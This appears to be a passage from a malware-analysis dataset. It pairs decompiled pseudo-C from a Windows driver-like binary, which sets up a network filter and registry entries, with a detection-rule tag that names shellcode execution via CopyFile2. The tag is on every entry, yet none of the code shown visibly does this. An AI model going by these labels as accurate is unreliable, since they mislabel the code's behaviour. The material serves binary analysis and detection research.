        "decompiled_code": "\nuint32_t fcn.00039e10(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    uint32_t uVar2;\n    int64_t **ppiVar3;\n    int64_t **arg1_00;\n    int64_t **ppiVar4;\n    uchar auStackX8 [32];\n    \n    if (arg1 == NULL) {\n        uVar2 = 0xc0000008;\n    }\n    else {\n        fcn.00032650(0x800f8, auStackX8, 0);\n        arg1_00 = *0x80110;\n        ppiVar4 = NULL;\n        ppiVar1 = *0x80110;\n        if (*0x80110 != NULL) {\n            do {\n                ppiVar3 = arg1_00;\n                arg1_00 = ppiVar3;\n                if (ppiVar3[3] == arg1) break;\n                arg1_00 = *ppiVar3;\n                ppiVar4 = ppiVar3;\n            } while (arg1_00 != NULL);\n            if ((arg1_00 != NULL) && (ppiVar1 = *arg1_00,  ppiVar4 != NULL)) {\n                *ppiVar4 = *arg1_00;\n                ppiVar1 = *0x80110;\n            }\n        }\n        *0x80110 = ppiVar1;\n        fcn.00032684(0x800f8, auStackX8, 0);\n        if (arg1_00 != NULL) {\n            if (arg1_00[6] != NULL) {\n                fcn.0005540c(arg1_00[6]);\n                fcn.0005540c(arg1_00[6] + 2);\n                fcn.0005540c(arg1_00[6] + 3);\n                fcn.0005540c(arg1_00[6] + 4);\n                fcn.0005540c(arg1_00[6] + 5);\n                fcn.0005540c(arg1_00[6] + 1);\n                fcn.00030d24(arg1_00[6]);\n            }\n            fcn.00030d24(arg1_00);\n        }\n        uVar2 = ~-(arg1_00 != NULL) & 0xc0000008;\n    }\n    return uVar2;\n}\n",
        "token_count": 529
    },
    "0003a168": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0003a168(void)\n\n{\n    int64_t iVar1;\n    ulong arg1;\n    uchar auStackX8 [32];\n    \n    arg1 = 0;\n    if (*0x80180 != 0) {\n        *0x80180 = 0;\n        fcn.00059140(*0x80168);\n        fcn.0005540c(0x80168);\n        fcn.00059140(*0x80170);\n        fcn.0005540c(0x80170);\n        fcn.00059140(*0x80178);\n        fcn.0005540c(0x80178);\n        fcn.00059140(*0x80158);\n        fcn.0005540c(0x80158);\n        fcn.00059140(*0x80150);\n        fcn.0005540c(0x80150);\n        while( true ) {\n            fcn.00032650(0x800f8, auStackX8, 1);\n            iVar1 = *0x80110;\n            if (*0x80110 != 0) {\n                arg1 = *(*0x80110 + 0x18);\n            }\n            fcn.00032684(0x800f8, auStackX8, 1);\n            if (iVar1 == 0) break;\n            fcn.00039e10(arg1);\n        }\n    }\n    return;\n}\n",
        "token_count": 317
    },
    "0003c3e8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.0003c3e8(void)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    uint auStackX8 [2];\n    uint auStackX16 [2];\n    uint auStackX24 [2];\n    int64_t iStackX32;\n    ulong in_stack_fffffffffffffcf0;\n    uint64_t uVar6;\n    uint uVar8;\n    ulong uVar7;\n    uchar auStack760 [16];\n    ulong uStack744;\n    uint auStack736 [2];\n    ulong uStack728;\n    uchar *puStack720;\n    uint uStack712;\n    ulong uStack704;\n    ulong uStack696;\n    uchar auStack688 [16];\n    ulong uStack672;\n    uint uStack664;\n    ulong uStack656;\n    ulong uStack648;\n    uint uStack640;\n    uchar uStack636;\n    ulong uStack632;\n    ulong uStack624;\n    ulong uStack616;\n    ulong uStack608;\n    uint uStack600;\n    ushort uStack596;\n    ulong uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    ulong uStack568;\n    ulong uStack560;\n    ulong uStack552;\n    uint uStack544;\n    uchar auStack536 [512];\n    \n    uVar2 = in_stack_fffffffffffffcf0 >> 0x20;\n    uStack632 = *0x14c08;\n    uStack624 = *0x14c10;\n    uStack672 = *0x14bf8;\n    uStack664 = *0x14c00;\n    uStack648 = *0x14be8;\n    uStack640 = *0x14bf0;\n    uStack636 = *0x14bf4;\n    uStack656 = 0x690064004e;\n    auStackX16[0] = 1;\n    uStack592 = *0x14bd0;\n    iStackX32 = 0;\n    uStack584 = *0x14bd8;\n    uStack576 = *0x14be0;\n    uStack568 = *0x14bb0;\n    uStack560 = *0x14bb8;\n    uStack552 = *0x14bc0;\n    uStack544 = *0x14bc8;\n    uStack616 = *0x14b98;\n    uStack608 = *0x14ba0;\n    uStack600 = *0x14ba8;\n    uStack596 = *0x14bac;\n    auStackX24[0] = 2;\n    auStackX8[0] = 2;\n    fcn.00066722(*0x14c08, auStack536, 0x100, 0x11b48, \n                 L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Network\\\\{4d36e974-e325-11ce-bfc1-08002be10318}\"\n                 , L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n    fcn.00066704(auStack688, auStack536);\n    puStack720 = auStack688;\n    auStack736[0] = 0x30;\n    uStack728 = 0;\n    uStack712 = 0x40;\n    uStack704 = 0;\n    uStack696 = 0;\n    uVar3 = fcn.000667f4(&uStack744, 0xf003f, auStack736, 0, 0, uVar2 << 0x20, auStackX8);\n    if (uVar3 != 0) {\n        return uVar3;\n    }\n    puVar5 = &uStack656;\n    fcn.00066722(auStack536, 0x100, 0x143d8, \n                 L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Network\\\\{4d36e974-e325-11ce-bfc1-08002be10318}\"\n                 , L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\", puVar5);\n    fcn.00066704(auStack688, auStack536);\n    puStack720 = auStack688;\n    uVar6 = puVar5 & 0xffffffff00000000;\n    auStack736[0] = 0x30;\n    uStack728 = 0;\n    uStack712 = 0x40;\n    uStack704 = 0;\n    uStack696 = 0;\n    uVar2 = fcn.000667f4(&iStackX32, 0xf003f, auStack736, 0, 0, uVar6, auStackX8);\n    uVar3 = uVar2;\n    if (uVar2 == 0) {\n        fcn.00066704(auStack760, &uStack592);\n        iVar4 = -1;\n        puVar5 = &uStack672;\n        do {\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            cVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n        } while (cVar1 != '\\0');\n        uVar6 = uVar6 & 0xffffffff00000000 | ~iVar4;\n        uVar2 = fcn.000666f8(iStackX32, auStack760, 0, 1, &uStack672, uVar6);\n        uVar3 = uVar2;\n        if (uVar2 == 0) {\n            fcn.00066704(auStack760, &uStack632);\n            iVar4 = -1;\n            puVar5 = &uStack648;\n            do {\n                if (iVar4 == 0) break;\n                iVar4 = iVar4 + -1;\n                cVar1 = *puVar5;\n                puVar5 = puVar5 + 1;\n            } while (cVar1 != '\\0');\n            uVar3 = uVar6 & 0xffffffff00000000 | ~iVar4;\n            uVar2 = fcn.000666f8(iStackX32, auStack760, 0, 1, &uStack648, uVar3);\n            uVar8 = uVar3 >> 0x20;\n            uVar3 = uVar2;\n            if (uVar2 == 0) {\n                fcn.00066704(auStack760, &uStack568);\n                uVar7 = CONCAT44(uVar8, 4);\n                uVar2 = fcn.000666f8(iStackX32, auStack760, 0, 4, auStackX16, uVar7);\n                uVar8 = uVar7 >> 0x20;\n                uVar3 = uVar2;\n                if (uVar2 == 0) {\n                    fcn.00066704(auStack760, &uStack616);\n                    uVar2 = fcn.000666f8(iStackX32, auStack760, 0, 4, auStackX24, CONCAT44(uVar8, 4));\n                    uVar3 = uVar2;\n                    if (uVar2 == 0) goto code_r0x0003c7c6;\n                }\n            }\n        }\n    }\n    fcn.00066728(uStack744);\ncode_r0x0003c7c6:\n    fcn.000666f2(uStack744);\n    if (iStackX32 != 0) {\n        fcn.000666f2();\n    }\n    return uVar3;\n}\n",
        "token_count": 1706
    },
    "0003c7f0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.0003c7f0(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    uint auStackX8 [2];\n    uint auStackX16 [2];\n    int64_t iStackX24;\n    ulong uStackX32;\n    ulong in_stack_fffffffffffffd80;\n    uint uVar3;\n    uint auStack616 [2];\n    ulong uStack608;\n    uchar *puStack600;\n    uint uStack592;\n    ulong uStack584;\n    ulong uStack576;\n    uchar auStack568 [16];\n    uchar auStack552 [16];\n    uchar auStack536 [520];\n    \n    uVar1 = in_stack_fffffffffffffd80 >> 0x20;\n    iStackX24 = 0;\n    auStackX16[0] = 1;\n    auStackX8[0] = 2;\n    fcn.00066722(auStack536, 0x100, 0x11b48, L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\", \n                 L\"filter_c06b1a3b\");\n    fcn.00066704(auStack568, auStack536);\n    puStack600 = auStack568;\n    auStack616[0] = 0x30;\n    uStack608 = 0;\n    uStack592 = 0x40;\n    uStack584 = 0;\n    uStack576 = 0;\n    uVar2 = fcn.000667f4(&uStackX32, 0xf003f, auStack616, 0, 0, uVar1 << 0x20, auStackX8);\n    if (uVar2 != 0) {\n        return uVar2;\n    }\n    uVar2 = 0;\n    fcn.00066722(auStack536, 0x100, 0x143d8, L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\", \n                 L\"filter_c06b1a3b\", 0x14c48);\n    fcn.00066704(auStack568, auStack536);\n    puStack600 = auStack568;\n    uVar2 = uVar2 & 0xffffffff00000000;\n    auStack616[0] = 0x30;\n    uStack608 = 0;\n    uStack592 = 0x40;\n    uStack584 = 0;\n    uStack576 = 0;\n    uVar1 = fcn.000667f4(&iStackX24, 0xf003f, auStack616, 0, 0, uVar2, auStackX8);\n    uVar3 = uVar2 >> 0x20;\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        fcn.00066704(auStack552, 0x14c18);\n        uVar1 = fcn.000666f8(iStackX24, auStack552, 0, 4, auStackX16, CONCAT44(uVar3, 4));\n        uVar2 = uVar1;\n        if (uVar1 == 0) goto code_r0x0003c9d2;\n    }\n    fcn.00066728(uStackX32);\ncode_r0x0003c9d2:\n    fcn.000666f2(uStackX32);\n    if (iStackX24 != 0) {\n        fcn.000666f2();\n    }\n    return uVar2;\n}\n",
        "token_count": 779
    },
    "0003cbac": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0003cbac(ulong arg1, ulong noname_1, uchar *arg3, ulong arg4)\n\n{\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    fcn.0006685a(arg3, 200);\n    *arg3 = 0x8b;\n    *(arg3 + 2) = 200;\n    arg3[1] = 1;\n    arg3[4] = 6;\n    arg3[5] = 0;\n    arg3[6] = 1;\n    arg3[7] = 0;\n    *(arg3 + 8) = 0;\n    fcn.00066704(&uStack72, L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n    *(arg3 + 0x10) = uStack72;\n    *(arg3 + 0x14) = uStack68;\n    *(arg3 + 0x18) = uStack64;\n    *(arg3 + 0x1c) = uStack60;\n    fcn.00066704(&uStack56, L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n    *(arg3 + 0x20) = uStack56;\n    *(arg3 + 0x24) = uStack52;\n    *(arg3 + 0x28) = uStack48;\n    *(arg3 + 0x2c) = uStack44;\n    fcn.00066704(&uStack40, L\"filter_c06b1a3b\");\n    *(arg3 + 0x40) = 0x3ca00;\n    *(arg3 + 0x30) = uStack40;\n    *(arg3 + 0x34) = uStack36;\n    *(arg3 + 0x38) = uStack32;\n    *(arg3 + 0x3c) = uStack28;\n    *(arg3 + 0x50) = 0x3ca18;\n    *(arg3 + 0x58) = 0x3ca64;\n    *(arg3 + 0x60) = 0x3ca4c;\n    *(arg3 + 0x68) = 0x3ca34;\n    *(arg3 + 0x48) = 0x3cb98;\n    *(arg3 + 0x98) = 0x3ca74;\n    *(arg3 + 0xa0) = 0x3caa4;\n    *(arg3 + 0xa8) = 0x3ca8c;\n    *(arg3 + 0x70) = 0x3cb24;\n    *(arg3 + 0x90) = 0x3cb44;\n    *(arg3 + 0x78) = 0x3cb08;\n    *(arg3 + 0x88) = 0x3cb60;\n    *(arg3 + 0xb0) = 0x3cad8;\n    *(arg3 + 0xb8) = 0x3caf0;\n    *(arg3 + 0xc0) = 0x3cac0;\n    *(arg3 + 0x80) = 0x3cb80;\n    (**0x8e6d8)(arg1, arg3, arg3, arg4);\n    return;\n}\n",
        "token_count": 826
    },
    "0003cd30": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.0003cd30(int64_t arg1, int64_t *arg2, int32_t *arg3)\n\n{\n    ulong uVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    int64_t iVar6;\n    int32_t iVar7;\n    int64_t iVar8;\n    int64_t aiStackX8 [3];\n    ulong uStackX32;\n    ulong auStack632 [2];\n    uchar auStack616 [208];\n    uchar auStack408 [48];\n    int64_t iStack360;\n    \n    aiStackX8[0] = 0;\n    if ((arg1 == 0) || (*(arg1 + 0x30) == 0)) {\n        uVar5 = 0x21590065;\n    }\n    else {\n        *arg3 = 0;\n        *arg2 = 0;\n        fcn.0006670a(auStack408, arg1, 0x150);\n        uVar1 = *(iStack360 + 0x28);\n        uVar5 = fcn.0003c7f0();\n        if (uVar5 == 0) {\n            uVar3 = fcn.0003c3e8();\n            uVar5 = uVar3;\n            if (uVar3 == 0) {\n                uVar3 = fcn.0003cbac(arg1, 0, auStack616, aiStackX8);\n                iVar6 = aiStackX8[0];\n                uVar5 = uVar3;\n                if (uVar3 == 0) {\n                    do {\n                        iVar7 = uVar5;\n                        iVar8 = uVar5 + iVar6;\n                        cVar2 = (**0x114b0)(iVar8);\n                        if ((cVar2 == '\\0') || (cVar2 = (**0x114b0)(iVar8 + 200),  cVar2 == '\\0')) break;\n                        iVar4 = fcn.0006674c(iVar8, auStack616, 200, 1, 1);\n                        if (iVar4 == 0) goto code_r0x0003ce2b;\n                        uVar5 = iVar7 + 1U;\n                    } while (iVar7 + 1U < 0xc0);\n                    iVar7 = -1;\ncode_r0x0003ce2b:\n                    if (iVar7 != -1) {\n                        *0x80234 = iVar7 + 4;\n                        *0x80238 = iVar7 + 5;\n                        *0x8023c = iVar7 + 8;\n                    }\n                    *0x80230 = iVar7;\n                    *0x80240 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca00);\n                    if (((((((*0x80240 == -1) ||\n                            (*0x80244 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca18),  *0x80244 == -1)) ||\n                           (*0x80248 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca64),  *0x80248 == -1)) ||\n                          ((*0x8024c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca4c),  *0x8024c == -1 ||\n                           (*0x80250 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca34),  *0x80250 == -1)))) ||\n                         (((*0x80254 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cb98),  *0x80254 == -1 ||\n                           ((*0x80258 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca74),  *0x80258 == -1 ||\n                            (*0x8025c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3caa4),  *0x8025c == -1)))) ||\n                          (*0x80240 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca00),  *0x80240 == -1)))) ||\n                        ((((*0x80260 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3ca8c),  *0x80260 == -1 ||\n                           (*0x80264 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cb24),  *0x80264 == -1)) ||\n                          (*0x80268 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cb44),  *0x80268 == -1)) ||\n                         (((*0x8026c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cb08),  *0x8026c == -1 ||\n                           (*0x80270 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cb60),  *0x80270 == -1)) ||\n                          ((*0x80274 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cad8),  *0x80274 == -1 ||\n                           ((*0x80278 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3caf0),  *0x80278 == -1 ||\n                            (*0x8027c = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cac0),  *0x8027c == -1)))))))))) ||\n                       (iVar6 = aiStackX8[0],  *0x80280 = fcn.0003d23c(aiStackX8[0], 0x200, 0x3cb80),  *0x80280 == -1))\n                    {\n                        uVar5 = 0x21590005;\n                    }\n                    else {\n                        uVar3 = -(*0x8027c != 0x118) & 0xc0000001;\n                        uVar5 = uVar3;\n                        if (uVar3 != 0) {\n                            return uVar5;\n                        }\n                        fcn.0001aac0(CONCAT71(iVar6 >> 8, 2), auStack632, &uStackX32);\n                        iVar7 = 0;\n                        for (iVar6 = aiStackX8[0]; iVar6 != 0; iVar6 = *(iVar6 + 8)) {\n                            if (iVar6 != aiStackX8[0]) {\n                                iVar7 = iVar7 + 1;\n                            }\n                        }\n                        fcn.0001abd4(auStack632[0], uStackX32);\n                        iVar8 = iVar7 << 3;\n                        iVar6 = fcn.00030cc4(iVar8);\n                        *arg2 = iVar6;\n                        if (iVar6 == 0) {\n                            uVar5 = 0xc000009a;\n                        }\n                        else {\n                            fcn.0001aac0(CONCAT71(iVar8 >> 8, 2), auStack632, &uStackX32);\n                            *arg3 = 0;\n                            iVar6 = aiStackX8[0];\n                            while ((iVar6 != 0 && (*arg3 < iVar7))) {\n                                if (iVar6 != aiStackX8[0]) {\n                                    *(*arg2 + *arg3 * 8) = iVar6;\n                                    *arg3 = *arg3 + 1;\n                                }\n                                iVar6 = *(iVar6 + 8);\n                            }\n                            fcn.0001abd4(auStack632[0], uStackX32);\n                        }\n                    }\n                }\n            }\n            if (aiStackX8[0] != 0) {\n                (**0x8e6d0)();\n            }\n            *(iStack360 + 0x28) = uVar1;\n            fcn.0006670a(arg1, auStack408, 0x150);\n            fcn.0003c34c(L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Control\\\\Network\\\\{4d36e974-e325-11ce-bfc1-08002be10318}\"\n                         , L\"{c06b1a3b-3d16-4181-8c8d-7015bfc5b972}\");\n            fcn.0003c34c(L\"\\\\Registry\\\\Machine\\\\System\\\\CurrentControlSet\\\\Services\", L\"filter_c06b1a3b\");\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 2015
    },
    "00046334": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint64_t fcn.00046334(uint64_t arg1, ulong arg2, ulong arg3, uint64_t arg4)\n\n{\n    uint64_t uVar1;\n    int64_t arg2_00;\n    int64_t **ppiVar2;\n    uint32_t in_stack_00000028;\n    ulong in_stack_ffffffffffffff78;\n    uint32_t uVar3;\n    uint32_t uStack120;\n    uchar auStack116 [4];\n    int64_t iStack112;\n    int64_t **ppiStack104;\n    int64_t iStack96;\n    int64_t aiStack88 [3];\n    \n    uVar3 = in_stack_ffffffffffffff78 >> 0x20;\n    arg4 = arg4 & 0xffffffff;\n    iStack96 = 0;\n    ppiStack104 = NULL;\n    iStack112 = 0;\n    uVar1 = fcn.00032f64(arg1, aiStack88);\n    uStack120 = uVar1;\n    if (uStack120 == 0) {\n        if (aiStack88[0] == 0) {\n            uVar1 = 0xc000009d;\n        }\n        else {\n            arg2_00 = fcn.00030cc4(arg4 + in_stack_00000028);\n            if (arg2_00 == 0) {\n                uVar1 = 0x21590004;\n            }\n            else {\n                uVar1 = arg4 | uVar3 << 0x20;\n                (**0x11018)(&uStack120, &iStack96, *0x80570, arg2_00, uVar1);\n                if (uStack120 == 0) {\n                    fcn.0006670a(arg2_00, arg3, arg4);\n                    (**0x11018)(&uStack120, &ppiStack104, *0x80570, arg2_00 + arg4, \n                                uVar1 & 0xffffffff00000000 | in_stack_00000028);\n                    if ((uStack120 == 0) &&\n                       ((**0x11098)(&uStack120, &iStack112),  ppiVar2 = ppiStack104,  uStack120 == 0)) {\n                        for (; *ppiVar2 != NULL; ppiVar2 = *ppiVar2) {\n                        }\n                        if (*(iStack112 + 8) == 0) {\n                            *(iStack112 + 0x10) = ppiVar2;\n                        }\n                        *ppiVar2 = *(iStack112 + 8);\n                        *(iStack112 + 8) = ppiStack104;\n                        *(iStack112 + 0x28) = 0;\n                        *(iStack112 + 0x70) = iStack96;\n                        uStack120 = (**(aiStack88[0] + 0x68))\n                                              (*(aiStack88[0] + 8), arg2, 0, in_stack_00000028, iStack112, auStack116);\n                        if (uStack120 == 0) {\n                            fcn.00045d88(arg1 & 0xffffffff, arg2_00, arg4, arg2_00 + arg4);\n                        }\n                        else if (uStack120 == 0x103) {\n                            iStack112 = 0;\n                            iStack96 = 0;\n                            ppiStack104 = NULL;\n                            uStack120 = 0;\n                            arg2_00 = 0;\n                        }\n                    }\n                }\n                if (iStack112 != 0) {\n                    (**0x110a8)();\n                }\n                if (iStack96 != 0) {\n                    (*_fcn.00011128)();\n                }\n                if (ppiStack104 != NULL) {\n                    (*_fcn.00011128)();\n                }\n                fcn.00030d24(arg2_00);\n                uVar1 = uStack120;\n            }\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 866
    },
    "00048008": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00048008(ulong noname_0, ulong arg2)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    uint8_t *arg2_00;\n    uint8_t auStackX24 [16];\n    \n    arg2_00 = auStackX24;\n    iVar3 = fcn.000471b0(arg2, arg2_00);\n    if (iVar3 != 0) {\n        ppiVar1 = iVar3 + 0x208;\n        while (*ppiVar1 != ppiVar1) {\n            piVar2 = *ppiVar1;\n            arg2_00 = NULL;\n            iVar3 = *piVar2;\n            *ppiVar1 = iVar3;\n            *(iVar3 + 8) = ppiVar1;\n            *(piVar2 + -0xf) = 0;\n            (**0x11590)(piVar2 + -0x15, 0);\n        }\n        (**0x113e8)(0x8e3c0, arg2_00 & 0xffffffffffffff00 | auStackX24[0]);\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00048d94": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint fcn.00048d94(int64_t arg1, int64_t arg2, ulong noname_2, uint64_t *arg4)\n\n{\n    int64_t iVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    int64_t aiStackX8 [4];\n    int32_t in_stack_00000028;\n    uint auStack88 [2];\n    uint32_t uStack80;\n    uchar auStack72 [40];\n    \n    bVar2 = false;\n    (*_fcn.00011608)(auStack72, 0);\n    auStack88[0] = 0xc0000001;\n    *(arg2 + 0x50) = auStack72;\n    *(arg2 + 0x48) = auStack88;\n    if (in_stack_00000028 != -1) {\n        iVar1 = *(arg2 + 0xb8);\n        *(iVar1 + -0x10) = 0x48068;\n        *(iVar1 + -0x45) = 0xe0;\n        *(iVar1 + -8) = auStack72;\n    }\n    iVar1 = *(arg2 + 0xb8);\n    *(arg2 + 0x43) = *(arg2 + 0x43) + -1;\n    *(arg2 + 0xb8) = iVar1 + -0x48;\n    *(iVar1 + -0x20) = arg1;\n    iVar4 = (**(*(arg1 + 8) + 0x70 + **(arg2 + 0xb8) * 8))();\n    bVar3 = false;\n    if (iVar4 == 0x103) {\n        if (in_stack_00000028 == -1) {\n            (*_fcn.00011630)();\n            goto code_r0x00048ecf;\n        }\n        aiStackX8[0] = in_stack_00000028 * -10000;\n        iVar4 = (*_fcn.00011630)(auStack72, 0, 0, 0, aiStackX8);\n        if (iVar4 == 0x102) {\n            (**0x114e0)(arg2);\n            (*_fcn.00011630)(auStack72, 0, 0, 0, 0);\n            bVar3 = true;\n        }\n    }\n    bVar2 = bVar3;\n    if (in_stack_00000028 != -1) {\n        (**0x11590)(arg2, 0);\n    }\ncode_r0x00048ecf:\n    if (bVar2) {\n        auStack88[0] = 0x102;\n    }\n    if (arg4 != NULL) {\n        *arg4 = uStack80;\n    }\n    return auStack88[0];\n}\n",
        "token_count": 617
    },
    "00049588": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00049588(void)\n\n{\n    int32_t iVar1;\n    int32_t aiStackX8 [8];\n    \n    aiStackX8[0] = 0;\n    if (*0x8d26c == 0) {\n        *0x8c658 = 0;\n        *0x8d260 = 0;\n        fcn.0002fc18(0x8c650);\n        *0x8c5f0 = 0x15c58;\n        *0x8c5f8 = aiStackX8;\n        *0x8c5d4 = 0;\n        *0x8c5e8 = 0x24;\n        iVar1 = fcn.00066854(1, 0x15c30, 0x8c5e0, 0, 0);\n        if (iVar1 == 0) {\n            *0x8d268 = aiStackX8[0] != 0;\n        }\n        *0x8d26c = 1;\n    }\n    return;\n}\n",
        "token_count": 237
    },
    "0004bc5c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0004bc5c(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    uint8_t in_stack_00000028;\n    uchar auStack72 [24];\n    uchar auStack48 [24];\n    \n    fcn.00044350(auStack48, 0x16, 0x14150, arg3 & 0xff);\n    fcn.00044350(auStack72, 0x16, 0x14150, in_stack_00000028);\n    fcn.0004b9ec(arg1, arg2, auStack48);\n    return;\n}\n",
        "token_count": 135
    },
    "0004bd34": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0004bd34(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong in_stack_00000028;\n    uchar auStack184 [80];\n    uchar auStack104 [80];\n    \n    fcn.0002ff70(arg3, auStack104, 0x41);\n    fcn.0002ff70(in_stack_00000028, auStack184, 0x41);\n    fcn.0004b9ec(arg1, arg2, auStack104);\n    return;\n}\n",
        "token_count": 116
    },
    "0004e070": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.0004e070(ulong arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    ulong auStackX24 [2];\n    \n    iVar1 = fcn.0004cf30(auStackX24, 0x400, arg1);\n    if (iVar1 == 0) {\n        fcn.0004cd70(auStackX24[0], arg2);\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "000505e0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.000505e0(ulong noname_0, int64_t arg2, ulong *arg3)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    int32_t iVar3;\n    int64_t arg1;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uStackX32;\n    ulong uStack328;\n    int64_t iStack320;\n    int64_t iStack312;\n    int64_t iStack304;\n    uint auStack296 [2];\n    ulong uStack288;\n    uchar auStack280 [16];\n    int64_t iStack264;\n    int64_t iStack248;\n    uint auStack240 [2];\n    ulong uStack232;\n    ulong uStack224;\n    uint uStack216;\n    ulong uStack208;\n    ulong uStack200;\n    ulong uStack192;\n    ulong uStack184;\n    ushort uStack168;\n    ushort uStack166;\n    uint uStack120;\n    int32_t iStack116;\n    ulong uStack104;\n    ulong uStack96;\n    ulong uStack88;\n    \n    arg1 = 0;\n    uStack328 = 0;\n    iStack320 = 0;\n    iVar4 = 0;\n    iStack304 = 0;\n    iStack312 = 0;\n    iStack248 = 0;\n    iVar3 = fcn.0004cd70(0xffffffffffffffff, &uStackX32);\n    iVar5 = arg1;\n    if (iVar3 == 0) {\n        if ((uStackX32 != '\\0') && (0xffffffff < *(arg2 + 0x23))) {\n            return 0x21590066;\n        }\n        iVar3 = fcn.0004cf94(0xffffffffffffffff, auStack280, 0, 0);\n        if (iVar3 == 0) {\n            arg1 = fcn.00030c98(0x500);\n            iVar5 = iVar4;\n            if (arg1 == 0) {\n                iVar3 = 0x21590004;\n            }\n            else {\n                uVar1 = *(arg2 + 0x33);\n                uVar2 = *(arg2 + 0x23);\n                fcn.0006677c(arg1, 0, 0x2a0);\n                *(arg1 + 0x30) = 0x10000b;\n                *(arg1 + 0x80) = uVar1;\n                *(arg1 + 0xf8) = uVar2;\n                *(arg1 + 0x98) = iStack264 + -0x28;\n                *(arg1 + 0xc0) = 0xf0e0d0c0a0908070;\n                auStack240[0] = 0x30;\n                uStack232 = 0;\n                uStack216 = 0;\n                uStack224 = 0;\n                uStack208 = 0;\n                uStack200 = 0;\n                iVar3 = fcn.0001ec38(&uStack328, 0x1f03ff, auStack240, 0xffffffffffffffff);\n                if 